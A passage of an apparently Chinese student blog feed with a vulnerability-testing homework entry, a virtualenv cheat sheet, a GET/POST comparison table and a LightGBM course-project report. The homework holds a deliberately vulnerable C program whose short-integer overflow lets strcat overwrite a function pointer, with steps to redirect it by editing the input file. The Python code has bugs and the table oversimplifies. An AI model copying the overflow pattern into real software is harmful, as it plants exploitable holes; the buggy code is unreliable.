class="literal">NULL</span>,<span class="string">"open"</span>,<span class="string">"notepad"</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,SW_SHOW);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	ShellExecute(<span class="literal">NULL</span>,<span class="string">"open"</span>,<span class="string">"calc"</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,SW_SHOW);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">void</span> (*fuc_ptr)()=func;</span><br><span class="line">	<span class="keyword">char</span> info[MAX_INFO];</span><br><span class="line">	<span class="keyword">char</span> info1[<span class="number">30000</span>]; <span class="keyword">char</span> info2[<span class="number">30000</span>];</span><br><span class="line"></span><br><span class="line">	freopen(<span class="string">"inputtxt"</span>,<span class="string">"r"</span>,<span class="built_in">stdin</span>);</span><br><span class="line">	<span class="built_in">cin</span>.getline(info1,<span class="number">30000</span>,<span class="string">' '</span>);</span><br><span class="line">	<span class="built_in">cin</span>.getline(info2,<span class="number">30000</span>,<span class="string">' '</span>);</span><br><span class="line"></span><br><span class="line">	short len1=<span class="built_in">strlen</span>(info1);</span><br><span class="line">	short len2=<span class="built_in">strlen</span>(info2);</span><br><span class="line">	short all_len=len1+len2;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(all_len&lt;MAX_INFO)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">strcpy</span>(info,info1);</span><br><span class="line">		<span class="built_in">strcat</span>(info,info2);</span><br><span class="line">	&#125;</span><br><span class="line">	fuc_ptr();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>当<code>len1</code>和<code>len2</code>均较大时,<code>short all_len = len1 + len2;</code> 使<code>all_len</code>发生溢出，进入<code>if</code>代码块，<code>info</code>长度为<code>len1+len2</code>,超过short范围，即<code>MAX_INFO</code>,<code>info</code>覆盖函数指针<code>fuc_ptr</code>的值。将原来<code>fuc_ptr</code>指向<code>func</code>函数改为指向<code>func1</code>函数即可</p>
<h3 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h3><ul>
<li>compile，下断点，debug运行，查看<code>func</code>和<code>func1</code>地址</li>
</ul>
<p><img src="/img/loading.gif" class="lazyload" data-src="/images/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A%E4%BA%94/image-20200415173506018.png"  alt="func地址"></p>
<p><img src="/img/loading.gif" class="lazyload" data-src="/images/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A%E4%BA%94/image-20200415173554559.png"  alt="func1地址"></p>
<ul>
<li><p>正常情况下运行弹出记事本</p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业五/image-20200415175701205.png"  alt="image-20200415175701205" style="zoom:40%;">
</li>
<li><p>input.txt中应为两段字符串，中间用空格隔开。当栈中info数据超出定义时的限制便会覆盖函数指针的内容，使用ultraedit修改input.txt，将超出部分修改为待调用函数的地址</p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业五/image-20200416234435774.png"  alt="image-20200416234435774" style="zoom:50%;">
</li>
<li><p>运行，弹出计算器</p>
</li>
</ul>
<img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业五/image-20200415191536378.png"  alt="image-20200415191536378" style="zoom:50%;">]]></content>
      <categories>
        <category>漏洞测试作业</category>
      </categories>
      <tags>
        <tag>漏洞测试</tag>
        <tag>整数溢出漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>Python virtualenv使用</title>
    <url>/2020/05/08/virtualenv/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pip install python-virtualenv</span><br><span class="line">virtualenv env # env为自主设置的虚拟环境名称</span><br><span class="line">cd env\Scripts # 前加路径</span><br><span class="line">activate # 激活</span><br><span class="line"></span><br><span class="line">deactivate # 退出</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>virtualenv</tag>
      </tags>
  </entry>
  <entry>
    <title>GET和POST的区别</title>
    <url>/2020/04/30/GET%E5%92%8CPOST%E7%9A%84%E5%8C%BA%E5%88%AB/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><table>
<thead>
<tr>
<th align="center">项目</th>
<th align="center">GET</th>
<th align="center">POST</th>
</tr>
</thead>
<tbody><tr>
<td align="center">书签</td>
<td align="center">可收藏为书签</td>
<td align="center">不可收藏为书签</td>
</tr>
<tr>
<td align="center">缓存</td>
<td align="center">能被缓存</td>
<td align="center">不能缓存</td>
</tr>
<tr>
<td align="center">编码类型</td>
<td align="center">application/x-www-form-urlenconded</td>
<td align="center">application/x-www-form-urlencoded或multipart/form-data,为二进制数据使用多重编码</td>
</tr>
<tr>
<td align="center">历史</td>
<td align="center">参数保留在浏览器历史中</td>
<td align="center">参数不会保留在浏览器历史中</td>
</tr>
<tr>
<td align="center">对数据长度的限制</td>
<td align="center">是的，当发送数据时，GET方法向URL添加数据；URL的长度是受限制的（最大长度是2048个字符）</td>
<td align="center">无限制</td>
</tr>
<tr>
<td align="center">对数据类型的限制</td>
<td align="center">只允许ASCII字符</td>
<td align="center">没有限制，也允许二进制数据</td>
</tr>
<tr>
<td align="center">安全性</td>
<td align="center">与POST相比，GET的安全性较差，因为发送的数据是URL的一部分。在发送密码或其他敏感信息时绝对不要使用GET！</td>
<td align="center">POST比GET更安全，因为参数不会保存在浏览器历史或web服务器日志中</td>
</tr>
<tr>
<td align="center">可见性</td>
<td align="center">数据在URL中对所有人都是可见的</td>
<td align="center">数据不会显示在URL中</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>python大作业报告</title>
    <url>/2020/04/30/python%E5%A4%A7%E4%BD%9C%E4%B8%9A%E6%8A%A5%E5%91%8A/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>大一下学期python课程大作业，参考网上源码</p>
<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a><strong>概述</strong></h2><ul>
<li>对数据进行分析和预处理，筛选数据</li>
<li>模型训练和参数调整</li>
<li>结果输出</li>
<li>模型评估</li>
</ul>
<hr>
<h2 id="库"><a href="#库" class="headerlink" title="库"></a><strong>库</strong></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd <span class="comment">#用于数据读入和处理</span></span><br><span class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> train_test_split <span class="comment">#划分数据集</span></span><br><span class="line"><span class="keyword">from</span> sklearn.preprocessing <span class="keyword">import</span> LabelEncoder <span class="comment"># 特征编码</span></span><br><span class="line"><span class="keyword">from</span> lightgbm <span class="keyword">import</span> LGBMClassifier <span class="comment"># 模型训练</span></span><br><span class="line"><span class="keyword">import</span> re <span class="comment"># 切词分析处理</span></span><br><span class="line"><span class="keyword">import</span> warnings</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="数据分析"><a href="#数据分析" class="headerlink" title="数据分析"></a><strong>数据分析</strong></h2><h3 id="1-ques-info-txt"><a href="#1-ques-info-txt" class="headerlink" title="1.ques_info.txt"></a>1.ques_info.txt</h3><h4 id="数据读入和预处理"><a href="#数据读入和预处理" class="headerlink" title="数据读入和预处理"></a>数据读入和预处理</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 数据集 1 ques_info.txt</span></span><br><span class="line"><span class="comment"># 包含训练集中涉及到的所有问题列表，每一行代表一个问题的相关信息, 每一</span></span><br><span class="line"><span class="comment"># 行有 7 列, 列之间采用 /tab 分隔符分割。</span></span><br><span class="line"><span class="comment"># [问题 ID 问题创建时间 问题标题的单字编码序列 问题标题的切词编码</span></span><br><span class="line"><span class="comment"># 序列 问题描述的单字编码序列 问题描述的词编码序列 问题绑定的话</span></span><br><span class="line"><span class="comment"># 题 ID]</span></span><br><span class="line"></span><br><span class="line">ques = pd.read_csv(<span class="string">"ques_info.txt"</span>, sep=<span class="string">'\t'</span>)</span><br><span class="line">ques.columns=<span class="string">"问题ID 问题创建时间 问题标题的单字编码序列 问题标题的切词编码序列\</span></span><br><span class="line"><span class="string"> 问题描述的单字编码序列 问题描述的词编码序列 问题绑定的话题ID"</span>.split(<span class="string">" "</span>)</span><br><span class="line">print(ques.shape[<span class="number">0</span>])</span><br><span class="line"><span class="keyword">for</span> col <span class="keyword">in</span> ques.columns:</span><br><span class="line">    print(col,len(ques[col].unique()))</span><br></pre></td></tr></table></figure>

<h5 id="输出结果"><a href="#输出结果" class="headerlink" title="输出结果"></a>输出结果</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">9668</span><br><span class="line">问题ID 9668</span><br><span class="line">问题创建时间 1660</span><br><span class="line">问题标题的单字编码序列 9668</span><br><span class="line">问题标题的切词编码序列 9649</span><br><span class="line">问题描述的单字编码序列 3841</span><br><span class="line">问题描述的词编码序列 3795</span><br><span class="line">问题绑定的话题ID 8900</span><br></pre></td></tr></table></figure>
<ul>
<li>说明：使用dataframe.columns()修改列名，便于后续编辑使用</li>
</ul>
<h3 id="2-user-info-txt"><a href="#2-user-info-txt" class="headerlink" title="2.user_info.txt"></a>2.user_info.txt</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 数据集 2 user_info.txt</span></span><br><span class="line"><span class="comment"># 包含训练集中用户相关特征信息，每一行代表一个用户的相关信息, 每一行有</span></span><br><span class="line"><span class="comment"># 21 列, 列之间采用 /tab 分隔符分割。</span></span><br><span class="line"></span><br><span class="line">user=pd.read_csv(<span class="string">"user_info.txt"</span>,sep=<span class="string">'\t'</span>)</span><br><span class="line">user.columns=<span class="string">"用户ID 性别 创作关键词的编码序列 创作数量等级\</span></span><br><span class="line"><span class="string"> 创作热度等级 注册类型 注册平台 访问频率 用户二分类特征A 用户二分类特征B\</span></span><br><span class="line"><span class="string"> 用户二分类特征C 用户二分类特征D 用户二分类特征E 用户分类特征A 用户分类特征B 用户分类特征C\</span></span><br><span class="line"><span class="string"> 用户分类特征D 用户分类特征E 用户的盐值分数 用户关注的话题\</span></span><br><span class="line"><span class="string"> 用户感兴趣的话题"</span>.split(<span class="string">" "</span>)</span><br><span class="line"><span class="keyword">for</span> col <span class="keyword">in</span> user.columns:</span><br><span class="line">    print(col,len(user[col].unique())) <span class="comment"># 一共有多少个用户，因为用户信息存在重复，使用series.unique（）去除重复部分并计数</span></span><br></pre></td></tr></table></figure>

<h5 id="输出结果-1"><a href="#输出结果-1" class="headerlink" title="输出结果"></a>输出结果</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">用户ID 7333</span><br><span class="line">性别 3</span><br><span class="line">创作关键词的编码序列 1</span><br><span class="line">创作数量等级 1</span><br><span class="line">创作热度等级 1</span><br><span class="line">注册类型 1</span><br><span class="line">注册平台 1</span><br><span class="line">访问频率 5</span><br><span class="line">用户二分类特征A 2</span><br><span class="line">用户二分类特征B 2</span><br><span class="line">用户二分类特征C 2</span><br><span class="line">用户二分类特征D 2</span><br><span class="line">用户二分类特征E 2</span><br><span class="line">用户分类特征A 385</span><br><span class="line">用户分类特征B 33</span><br><span class="line">用户分类特征C 97</span><br><span class="line">用户分类特征D 336</span><br><span class="line">用户分类特征E 2</span><br><span class="line">用户的盐值分数 484</span><br><span class="line">用户关注的话题 6207</span><br><span class="line">用户感兴趣的话题 6278</span><br></pre></td></tr></table></figure>

<ul>
<li><p>结果分析：输出结果为1的项目，创作关键词的编码序列、创作数量等级、创作热度等级、注册类型、注册平台均对结果无影响，删除这几列</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> col <span class="keyword">in</span> user.columns:</span><br><span class="line">    <span class="keyword">if</span> len(user[col].unique())==<span class="number">1</span>:</span><br><span class="line">        user.drop([col],axis=<span class="number">1</span>,inplace=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
<h3 id="3-data-txt"><a href="#3-data-txt" class="headerlink" title="3.data.txt"></a>3.data.txt</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data = pd.read_csv(<span class="string">"data.txt"</span>, sep=<span class="string">'\t'</span>)</span><br><span class="line">data.columns = <span class="string">"问题ID 用户ID 邀请创建时间 邀请是否被回答"</span>.split(<span class="string">" "</span>)</span><br></pre></td></tr></table></figure>
<h3 id="4-数据集合并"><a href="#4-数据集合并" class="headerlink" title="4.数据集合并"></a>4.数据集合并</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data = pd.merge(data, user, how=<span class="string">'left'</span>, on=<span class="string">'用户ID'</span>)</span><br><span class="line">data = pd.merge(data, ques, how=<span class="string">'left'</span>, on=<span class="string">'问题ID'</span>)</span><br></pre></td></tr></table></figure></li>
<li><p>说明：</p>
<ul>
<li>以data.txt中的内容为基准，整理三个文件中的信息至一个dataframe，其中user与data中的用户ID相对应，ques与data中的问题ID相对应<h3 id="5-数据集划分"><a href="#5-数据集划分" class="headerlink" title="5.数据集划分"></a>5.数据集划分</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> train_test_split</span><br><span class="line"></span><br><span class="line">train, testd = train_test_split(data, train_size=<span class="number">0.8</span>)</span><br><span class="line">val, testd = train_test_split(testd, train_size=<span class="number">0.5</span>)</span><br><span class="line">y_train = data[:train.shape[<span class="number">0</span>]][<span class="string">'邀请是否被回答'</span>].values</span><br><span class="line">x_train = data[:train.shape[<span class="number">0</span>]].drop([<span class="string">'邀请是否被回答'</span>], axis=<span class="number">1</span>).values</span><br><span class="line"></span><br><span class="line">y_val = data[train.shape[<span class="number">0</span>]:train.shape[<span class="number">0</span>] + val.shape[<span class="number">0</span>]][<span class="string">'邀请是否被回答'</span>].values</span><br><span class="line">x_val = data[train.shape[<span class="number">0</span>]:train.shape[<span class="number">0</span>] + val.shape[<span class="number">0</span>]].drop([<span class="string">'邀请是否被回答'</span>], axis=<span class="number">1</span>).values</span><br><span class="line"></span><br><span class="line">x_test = data[train.shape[<span class="number">0</span>] + val.shape[<span class="number">0</span>]:].drop([<span class="string">'邀请是否被回答'</span>], axis=<span class="number">1</span>).values</span><br><span class="line">y_test = data[train.shape[<span class="number">0</span>] + val.shape[<span class="number">0</span>]:][<span class="string">'邀请是否被回答'</span>].values</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p>将data按8:1:1的比例划分成train、validation、test，其中train用于模型训练，validation用于模型选择和参数调整，test用于对比模型预测和实际值并对模型进行评估</p>
</li>
</ul>
<hr>
<h2 id="变量处理"><a href="#变量处理" class="headerlink" title="变量处理"></a><strong>变量处理</strong></h2><h3 id="时间"><a href="#时间" class="headerlink" title="时间"></a><strong>时间</strong></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data[<span class="string">'邀请创建时间-day'</span>] = data[<span class="string">'邀请创建时间'</span>].apply(<span class="keyword">lambda</span> x: float(x.split(<span class="string">'-'</span>)[<span class="number">0</span>].split(<span class="string">'D'</span>)[<span class="number">1</span>]))</span><br><span class="line">data[<span class="string">'邀请创建时间-hour'</span>] = data[<span class="string">'邀请创建时间'</span>].apply(<span class="keyword">lambda</span> x: float(x.split(<span class="string">'-'</span>)[<span class="number">1</span>].split(<span class="string">'H'</span>)[<span class="number">1</span>]))</span><br><span class="line"></span><br><span class="line">data[<span class="string">'问题创建时间-day'</span>] = data[<span class="string">'问题创建时间'</span>].apply(<span class="keyword">lambda</span> x: float(x.split(<span class="string">'-'</span>)[<span class="number">0</span>].split(<span class="string">'D'</span>)[<span class="number">1</span>]))</span><br><span class="line">data[<span class="string">'问题创建时间-hour'</span>] = data[<span class="string">'问题创建时间'</span>].apply(<span class="keyword">lambda</span> x: float(x.split(<span class="string">'-'</span>)[<span class="number">1</span>].split(<span class="string">'H'</span>)[<span class="number">1</span>]))</span><br></pre></td></tr></table></figure>
<ul>
<li>说明：<ul>
<li>格式为：D3-H4，分解成天和时两个变量，使用函数split(“-“),并且脱去字母D和H，转成float类型，便于后续的模型训练</li>
<li>apply函数，功能为将一个siries中的全部元素通过括号内的元素映射成另一个值</li>
</ul>
</li>
</ul>
<h3 id="话题"><a href="#话题" class="headerlink" title="话题"></a><strong>话题</strong></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ls = [i <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, data.shape[<span class="number">0</span>])]</span><br><span class="line"><span class="comment"># 分割字符串成为字典</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sp_dict</span><span class="params">(a)</span>:</span></span><br><span class="line">    a = re.split(<span class="string">'[,:]'</span>, a)</span><br><span class="line">    a[<span class="number">1</span>::<span class="number">2</span>] = map(float, a[<span class="number">1</span>::<span class="number">2</span>]) <span class="comment"># 将数值字符穿转换为float便于计算</span></span><br><span class="line">    b = dict(zip(a[::<span class="number">2</span>], a[<span class="number">1</span>::<span class="number">2</span>]))<span class="comment"># 使用zip函数合成字典</span></span><br><span class="line">    <span class="keyword">return</span> b</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sp</span><span class="params">(i)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> data</span><br><span class="line">    <span class="comment"># dataframe.ix()函数说明见下方</span></span><br><span class="line">    a = data.ix[i, <span class="string">"用户关注的话题"</span>].split(<span class="string">","</span>) </span><br><span class="line">    b = data.ix[i, <span class="string">"问题绑定的话题ID"</span>].split(<span class="string">","</span>)</span><br><span class="line">    c = sp_dict(data.ix[i, <span class="string">"用户感兴趣的话题"</span>])</span><br><span class="line">    cn1 = <span class="number">0</span></span><br><span class="line">    cn2 = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> b:</span><br><span class="line">        <span class="keyword">if</span> j <span class="keyword">in</span> a: <span class="comment"># 计算对该问题所涉及话题用户的关注个数</span></span><br><span class="line">            cn1 += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> j <span class="keyword">in</span> c: <span class="comment"># 计算用户对该问题所涉及话题感兴趣的程度</span></span><br><span class="line">            cn2 += c[j]</span><br><span class="line">    data.ix[i, <span class="string">"用户关注话题程度"</span>] = cn1</span><br><span class="line">    data.ix[i, <span class="string">"用户感兴趣话题程度"</span>] = cn2</span><br><span class="line"></span><br><span class="line">list(map(sp, ls))  <span class="comment"># 利用map函数进行批量处理，list()用于解决map函数不调用的问题</span></span><br></pre></td></tr></table></figure>
<ul>
<li><p>说明</p>
<ul>
<li><p>用户关注的话题</p>
<ul>
<li>读入时为字符串，eg.”T1727,T5310,T3402,T916,T1506,T26329,T7293,T18098,T14572,T6657,T56,T50,T68,T148,T89,T38,T5,T32”,利用代码：<code>a = data.ix[i, &quot;用户关注的话题&quot;].split(&quot;,&quot;)</code>分解成列表</li>
</ul>
</li>
<li><p>问题绑定的话题ID</p>
<ul>
<li>同理，利用代码<code>b = data.ix[i, &quot;问题绑定的话题ID&quot;].split(&quot;,&quot;)</code>分解成列表，方便与用户关注的话题进行比对</li>
</ul>
</li>
<li><p>用户感兴趣的话题</p>
<ul>
<li>格式为 T1:0.2,T2:0.5:T3,-0.3,…,Tn:0.42，利用代码<code>c = sp_dict(data.ix[i, &quot;用户感兴趣的话题&quot;])</code>分解成字典格式，其中sp_dict函数实现为<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sp_dict</span><span class="params">(a)</span>:</span> <span class="comment"># 分割字符串成为字典</span></span><br><span class="line">    a = re.split(<span class="string">'[,:]'</span>, a)</span><br><span class="line">    a[<span class="number">1</span>::<span class="number">2</span>] = map(float, a[<span class="number">1</span>::<span class="number">2</span>]) <span class="comment"># 将数值字符穿转换为float便于计算</span></span><br><span class="line">    b = dict(zip(a[::<span class="number">2</span>], a[<span class="number">1</span>::<span class="number">2</span>]))<span class="comment"># 使用zip函数合成字典</span></span><br><span class="line">    <span class="keyword">return</span> b</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>对每一个问题，对比问题绑定的话题ID列表和用户关注的话题列表，将重合的数目，即对该问题所涉及话题用户的关注个数计入cn1中；对比问题绑定话题ID列表和用户感兴趣的话题程度字典，计算用户对该问题的感兴趣程度，将结果计入cn2中</p>
</li>
<li><p>.ix函数说明：</p>
<ul>
<li>用于同时利用位置和列（行）名进行位置索引</li>
<li>使用示例：<code>data.ix[i, &quot;用户关注的话题&quot;]</code></li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="其它文字信息"><a href="#其它文字信息" class="headerlink" title="其它文字信息"></a><strong>其它文字信息</strong></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.preprocessing <span class="keyword">import</span> LabelEncoder</span><br><span class="line">feat = [<span class="string">'用户ID'</span>, <span class="string">'问题ID'</span>, <span class="string">'性别'</span>, <span class="string">'访问频率'</span>, <span class="string">'用户分类特征A'</span>, <span class="string">'用户分类特征B'</span>, <span class="string">'用户分类特征C'</span>, <span class="string">'用户分类特征D'</span>,<span class="string">'用户分类特征E'</span>]</span><br><span class="line">encoder = LabelEncoder()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> feat:</span><br><span class="line">    encoder.fit(data[i])</span><br><span class="line">    data[feat] = encoder.transform(data[i])</span><br></pre></td></tr></table></figure>
<ul>
<li>说明：<br>  feat列表中为文字信息，利用sklearn.processing中的LabelEncoder对文字信息进行编号，将dataframe转换成纯数字的矩阵，使其可以进行模型训练<h3 id="其它变量"><a href="#其它变量" class="headerlink" title="其它变量"></a><strong>其它变量</strong></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">drop_feat = [<span class="string">'问题标题的单字编码序列'</span>, <span class="string">'问题标题的切词编码序列'</span>,</span><br><span class="line">             <span class="string">'问题描述的单字编码序列'</span>, <span class="string">'问题描述的切词编码序列'</span>,</span><br><span class="line">             <span class="string">'问题创建时间'</span>, <span class="string">'邀请创建时间'</span>, <span class="string">'注册类型'</span>, <span class="string">'注册平台'</span>,</span><br><span class="line">             <span class="string">'用户关注的话题'</span>, <span class="string">'问题绑定的话题ID'</span>, <span class="string">'用户感兴趣的话题'</span>]</span><br><span class="line">data = data.drop(columns=drop_feat, axis=<span class="number">1</span>)</span><br></pre></td></tr></table></figure></li>
<li>由前期的数据分析可知<ul>
<li>信息：创作关键词的编码序列、创作数量等级、创作热度等级、注册类型、注册平台均无法对数据进行区分，没有分析价值，故舍去。</li>
<li>信息：问题标题的单字编码序列、问题描述的单字编码序列与切词编码序列携带信息在内容上有一定的重复，为防止模型过拟合，删去。</li>
<li>信息：用户关注的话题、问题绑定的话题ID、用户感兴趣的话题、问题创建时间、邀请创建时间 均已在前面的代码中分析过并转化成更适合模型训练的格式，故删去。</li>
</ul>
</li>
<li>经过上述处理，dataframe为图片中的格式：</li>
<li><img src="/img/loading.gif" class="lazyload" data-src="http://static.zybuluo.com/LittleFairyDoesntLoseHair/e632zd78oq19hxm363zqcugz/image_1dr3obtl61fiak6q13g51g6hrae9.png"  alt="image_1dr3obtl61fiak6q13g51g6hrae9.png-248.5kB"></li>
</ul>
<hr>
<h2 id="模型训练和参数调整"><a href="#模型训练和参数调整" class="headerlink" title="模型训练和参数调整"></a><strong>模型训练和参数调整</strong></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">from</span> lightgbm <span class="keyword">import</span> LGBMClassifier</span><br><span class="line"></span><br><span class="line">model_lgb = LGBMClassifier(boosting_type=<span class="string">'gbdt'</span>, num_leaves=<span class="number">64</span>, learning_rate=<span class="number">0.01</span>, n_estimators=<span class="number">8000</span>,</span><br><span class="line">                           max_bin=<span class="number">425</span>, subsample_for_bin=<span class="number">50000</span>, objective=<span class="string">'binary'</span>, min_split_gain=<span class="number">0</span>,</span><br><span class="line">                           min_child_weight=<span class="number">5</span>, min_child_samples=<span class="number">10</span>, subsample=<span class="number">0.8</span>, subsample_freq=<span class="number">1</span>,</span><br><span class="line">                           colsample_bytree=<span class="number">1</span>, reg_alpha=<span class="number">3</span>, reg_lambda=<span class="number">5</span>, seed=<span class="number">500</span>, n_jobs=<span class="number">-1</span>, silent=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">model_lgb.fit(x_train, y_train, eval_names=[<span class="string">'train'</span>], eval_metric=[<span class="string">'logloss'</span>, <span class="string">'auc'</span>], eval_set=[(x_train, y_train)],</span><br><span class="line">              early_stopping_rounds=<span class="number">10</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li>说明<ul>
<li>使用lightgbm对模型进行训练</li>
</ul>
</li>
<li>参数详解：<ul>
<li>LGBMclassifier：<ul>
<li>boosting_type 提升树的类型</li>
<li>num_leaves   树的最大叶子数，一般为2^(max_depth)</li>
<li>learning_rate 学习率</li>
<li>n_estimators 拟合的树的棵树，相当于训练轮数</li>
<li>max_bin<ul>
<li>如果需要更快的训练速度，max_bin应设置小一些</li>
<li>如果需要较高的准确度，应设置大一些</li>
</ul>
</li>
<li>subsample_for_bin</li>
<li>objective 学习任务参数，binary为二分类</li>
<li>min_split_gain 最小分割增益</li>
<li>min_child_weight  分支结点的最小权重</li>
<li>min_child_samples</li>
<li>subsample 训练样本采样率 行</li>
<li>subsample_freq 子样本频率</li>
<li>colsample_bytree 训练特征采样率 列</li>
<li>reg_alpha L1正则化系数</li>
<li>re_lambda L2正则化系数</li>
<li>seed 随机种子数</li>
<li>n_jobs 并行运行多线程核心数</li>
<li>silent 训练过程是否打印日志信息</li>
</ul>
</li>
<li>fit<ul>
<li>early_stopping_rounds=10 <ul>
<li>当eval_matrix在10轮中都没有提升时停止训练</li>
</ul>
</li>
<li>eval_matrix<ul>
<li>在lgbm处理二分类问题时，将eval_matrix设定成<code>eval_metric=[&#39;logloss&#39;, &#39;auc&#39;]</code>,其中logloss是对数损失函数，auc是ROC曲线下与坐标轴围成的面积，AUC越接近1.0，检测方法真实性越高;等于0.5时，则真实性最低</li>
</ul>
</li>
</ul>
</li>
<li>控制过拟合：<ul>
<li>降低模型复杂度：max_depth, min_child_weight and gamma</li>
<li>对样本随机采样：subsample, colsample_bytree</li>
<li>降低学习率，同时相应提高训练轮数</li>
</ul>
</li>
<li>决策树类型选择——gdbt<ul>
<li>是一种迭代的决策树算法，该算法由多棵决策树组成，所有树的结论累加起来做最终答案</li>
<li>适用于二分类问题</li>
</ul>
</li>
</ul>
</li>
</ul>
<hr>
<h2 id="结果输出"><a href="#结果输出" class="headerlink" title="结果输出"></a><strong>结果输出</strong></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">y = model_lgb.predict(x_test)</span><br><span class="line">y_v = model_lgb.predict(x_val)</span><br><span class="line"></span><br><span class="line"><span class="comment"># result取data.txt 中用于test部分的前三列，即删去“邀请是否回答”内容</span></span><br><span class="line">result = testd.iloc[:, :<span class="number">3</span>] </span><br><span class="line">result[<span class="string">'是否被回答'</span>] = y</span><br><span class="line"></span><br><span class="line">result.to_csv(<span class="string">'result.txt'</span>, index=<span class="literal">False</span>, header=<span class="literal">True</span>, sep=<span class="string">'\t'</span>) <span class="comment"># 将结果写入文件中</span></span><br></pre></td></tr></table></figure>
<hr>
<h2 id="模型评估"><a href="#模型评估" class="headerlink" title="模型评估"></a><strong>模型评估</strong></h2><ul>
<li>比较test集预测准确度<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">judge = result.merge(testd, how=<span class="string">'left'</span>, on=<span class="string">'问题ID'</span>)</span><br><span class="line">judge[<span class="string">'判断是否准确'</span>] = judge[[<span class="string">'是否被回答'</span>, <span class="string">'邀请是否被回答'</span>]].apply(<span class="keyword">lambda</span> x: x[<span class="string">'是否被回答'</span>] == x[<span class="string">'邀请是否被回答'</span>], axis=<span class="number">1</span>)</span><br><span class="line">print(list(judge[<span class="string">'判断是否准确'</span>]).count(<span class="literal">True</span>) / len(list(judge[<span class="string">'判断是否准确'</span>])))</span><br></pre></td></tr></table></figure>


</li>
</ul>
<ul>
